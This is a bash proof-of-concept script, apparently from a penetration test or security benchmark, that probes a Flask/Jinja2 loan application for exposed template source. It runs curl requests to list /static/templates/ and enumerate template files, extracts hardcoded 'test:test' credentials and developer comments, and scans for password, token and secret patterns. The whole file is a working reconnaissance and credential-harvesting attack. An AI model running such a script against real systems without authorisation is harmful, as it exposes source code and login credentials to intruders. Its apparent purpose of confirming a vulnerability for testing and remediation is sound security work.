#!/bin/bash

# POC: Jinja2 Template Source Code Exposure via Static Directory Access
# This script demonstrates:
# 1. Directory listing at /static/templates/
# 2. Individual template file access
# 3. Extraction of hardcoded credentials
# 4. Exposure of application structure and developer comments

TARGET="${1:-http://localhost:5000}"

echo "[*] POC: Jinja2 Template Source Code Exposure"
echo "[*] Target: $TARGET"
echo ""

# Test 1: Check directory listing
echo "[+] Test 1: Attempting to access /static/templates/ directory listing"
RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/static/templates/")
if [ "$RESPONSE" = "200" ]; then
    echo "[✓] Directory listing accessible (HTTP $RESPONSE)"
    echo "[+] Directory contents:"
    curl -s "$TARGET/static/templates/" | grep -o 'href="[^"]*"' | sed 's/href="//;s/"$//' | grep '\.html' || echo "    (HTML parsing failed, but directory accessible)"
else
    echo "[✗] Directory listing returned HTTP $RESPONSE"
fi
echo ""

# Test 2: Access login.html template
echo "[+] Test 2: Accessing /static/templates/login.html"
LOGIN_RESPONSE=$(curl -s "$TARGET/static/templates/login.html")
LOGIN_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/static/templates/login.html")

if [ "$LOGIN_CODE" = "200" ]; then
    echo "[✓] login.html accessible (HTTP $LOGIN_CODE)"
    echo "[+] Checking for exposed credentials and comments:"
    
    # Look for test credentials
    if echo "$LOGIN_RESPONSE" | grep -q "test:test"; then
        echo "[✓] FOUND: Hardcoded test credentials (test:test)"
        echo "    $(echo "$LOGIN_RESPONSE" | grep -o ".*test:test.*" | head -1)"
    fi
    
    # Look for TODO comments
    if echo "$LOGIN_RESPONSE" | grep -q "TODO"; then
        echo "[✓] FOUND: Developer TODO comments exposed"
        echo "    $(echo "$LOGIN_RESPONSE" | grep -o ".*TODO.*" | head -1)"
    fi
    
    # Show template structure
    echo "[+] Template source preview (first 500 chars):"
    echo "    $(echo "$LOGIN_RESPONSE" | head -c 500)..."
else
    echo "[✗] login.html returned HTTP $LOGIN_CODE"
fi
echo ""

# Test 3: Enumerate other template files
echo "[+] Test 3: Enumerating accessible template files"
TEMPLATES=("home.html" "profile.html" "loan_details.html" "error.html" "not_implemented.html")

for template in "${TEMPLATES[@]}"; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/static/templates/$template")
    if [ "$CODE" = "200" ]; then
        echo "[✓] $template - HTTP $CODE (accessible)"
    else
        echo "[✗] $template - HTTP $CODE"
    fi
done
echo ""

# Test 4: Extract all comments from templates
echo "[+] Test 4: Extracting comments from all accessible templates"
for template in "${TEMPLATES[@]}"; do
    CONTENT=$(curl -s "$TARGET/static/templates/$template" 2>/dev/null)
    COMMENTS=$(echo "$CONTENT" | grep -o "<!--.*-->" | head -3)
    if [ -n "$COMMENTS" ]; then
        echo "[✓] Found comments in $template:"
        echo "$COMMENTS" | sed 's/^/    /'
    fi
done
echo ""

# Test 5: Check for sensitive information patterns
echo "[+] Test 5: Scanning for sensitive information patterns"
ALL_TEMPLATES=$(for t in "${TEMPLATES[@]}"; do curl -s "$TARGET/static/templates/$t" 2>/dev/null; done)

PATTERNS=(
    "password"
    "apikey"
    "secret"
    "token"
    "credentials"
    "TODO"
    "FIXME"
    "HACK"
    "DEBUG"
)

for pattern in "${PATTERNS[@]}"; do
    COUNT=$(echo "$ALL_TEMPLATES" | grep -ci "$pattern")
    if [ "$COUNT" -gt 0 ]; then
        echo "[✓] Pattern '$pattern' found $COUNT times in templates"
    fi
done
echo ""

echo "[!] VULNERABILITY CONFIRMED"
echo "[!] Summary:"
echo "    - Template files are directly accessible via HTTP"
echo "    - Source code and developer comments are exposed"
echo "    - Hardcoded credentials and sensitive information visible"
echo "    - Application structure can be enumerated"
echo "    - Jinja2 template logic is exposed to attackers"